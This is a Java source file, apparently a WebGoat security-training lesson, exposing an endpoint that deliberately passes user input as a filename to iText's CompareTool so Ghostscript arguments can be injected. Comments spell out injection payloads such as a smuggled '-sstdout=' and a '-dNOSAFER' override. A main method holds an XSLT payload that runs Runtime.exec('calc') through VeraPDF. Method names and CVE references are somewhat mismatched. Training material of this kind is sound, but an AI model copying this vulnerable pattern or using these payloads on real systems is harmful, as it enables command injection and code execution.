/*
 * This file is part of WebGoat, an Open Web Application Security Project utility. For details, please see http://www.owasp.org/
 *
 * Copyright (c) 2002 - 2019 Bruce Mayhew
 *
 * This program is free software; you can redistribute it and/or modify it under the terms of the
 * GNU General Public License as published by the Free Software Foundation; either version 2 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
 * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along with this program; if
 * not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA
 * 02111-1307, USA.
 *
 * Getting Source ==============
 *
 * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository for free software projects.
 */

package org.owasp.webgoat.lessons.ossitextpdfio;

import com.itextpdf.kernel.utils.CompareTool;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;
import org.owasp.webgoat.container.assignments.AssignmentEndpoint;
import org.owasp.webgoat.container.assignments.AssignmentHints;
import org.owasp.webgoat.container.assignments.AttackResult;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;
import org.verapdf.core.VeraPDFException;
import org.verapdf.policy.PolicyChecker;

/**
 * Description: An attacker controlling the filename passed to the CompareTool class, is able to
 * inject arbitrary parameters in the command line being executed (ghostscript). The vulnerable code
 * resides inside the com/itextpdf/io/util/GhostscriptHelper.java.
 *
 * <p>//$ITEXT_GS_EXEC -dSAFER -dNOPAUSE -dBATCH -sDEVICE=png16m -r150 -sOutputFile="./cmp_xxx.pdf"
 * - yyyyy-%03d.png" "xxx.pdf" - yyyyy"
 *
 * <p>//-dNOSAFER overrides -dSAFER
 *
 * <p>//javac -cp ".:*" Example.java; ITEXT_GS_EXEC=/usr/bin/gs java -cp ".:*" Example "xxx.pdf\"
 * -sstdout=a.txt" //DROPS a file called 'a.txt-%03d.png\ xxx.pdf\ -sstdout=a.txt' on the filesystem
 *
 * <p>a.txt-d.png\ xxx.pdf\ -sstdout=a.txt
 */
@RestController
@AssignmentHints({"vulnerable-itextpdf-io.hint"})
public class VulnerableITextPdfIOComponentsLesson extends AssignmentEndpoint {

  Logger log = LoggerFactory.getLogger(this.getClass().getName());

  @PostMapping("/VulnerableITextPdfIOComponentsLesson/CVE-2024-28109")
  public @ResponseBody AttackResult NacosYamlParser(
      @RequestParam String payload,
      @RequestParam(required = false, defaultValue = "true") Boolean isXsl) {
    //// https://security.snyk.io/vuln/SNYK-JAVA-ORGVERAPDF-6513793 - CVE-2024-28109

    log.info("VulnerableVeraPdfCoreJakartaComponents called with payload : {}", payload);
    try {

      // Parameter injection: javac -cp ".:*" Example.java; ITEXT_GS_EXEC=/usr/bin/gs java -cp ".:*"
      // Example "a.pdf\\\" -?"
      // javac -cp ".:*" Example.java; ITEXT_GS_EXEC=/usr/bin/gs java -cp ".:*" Example "xxx.pdf\" -
      // \0"

      CompareTool ct = new CompareTool();
      String policyResultOss = ct.compareVisually("a.pdf", payload, ".", ".", null);

      if (policyResultOss.toString().contains("pid")) {
        return success(this)
            .feedback("vulnerable-itextpdf-io-components.success")
            .output(policyResultOss.toString())
            .build();
      }
      // obj.get("docmuemtn)
    } catch (Exception ex) {
      return failed(this)
          .feedback("vulnerable-itextpdf-io-components.close")
          .output(ex.getMessage())
          .build();
    }

    return failed(this)
        .feedback("vulnerable-itextpdf-io-components.fromXML")
        .feedbackArgs(payload)
        .build();
  }

  public static void main(String[] args) {
    // String payload="";
    String payload =
        "<xsl:stylesheet version=\"1.0\"\r\n"
            + "	xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\r\n"
            + "	xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\"\r\n"
            + "	xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\">\r\n"
            + "	<xsl:template match=\"/\">\r\n"
            + "		<xsl:variable name=\"rtobject\" select=\"rt:getRuntime()\" />\r\n"
            + "		<xsl:variable name=\"process\" select=\"rt:exec($rtobject,'calc')\" />\r\n"
            + "		<xsl:variable name=\"processString\"	select=\"ob:toString($process)\" />\r\n"
            + "		<xsl:value-of select=\"$processString\" />\r\n"
            + "	</xsl:template>\r\n"
            + "</xsl:stylesheet>";
    boolean isXsl = true;
    InputStream is = new ByteArrayInputStream(payload.getBytes(StandardCharsets.UTF_8));
    OutputStream policyResultOss =
        new OutputStream() {
          StringBuilder sb = new StringBuilder();

          @Override
          public void write(int b) throws IOException {
            this.sb.append((char) b);
          }

          public String toString() {
            return this.sb.toString();
          }
        };
    try {
      PolicyChecker.applyPolicy(
          new ByteArrayInputStream(payload.getBytes(StandardCharsets.UTF_8)),
          is,
          policyResultOss,
          isXsl);
    } catch (VeraPDFException e) {
      // TODO Auto-generated catch block
      e.printStackTrace();
    }

    System.out.println(" Output ---> " + policyResultOss);
    // payload = "<demo><demo>";

  }
}
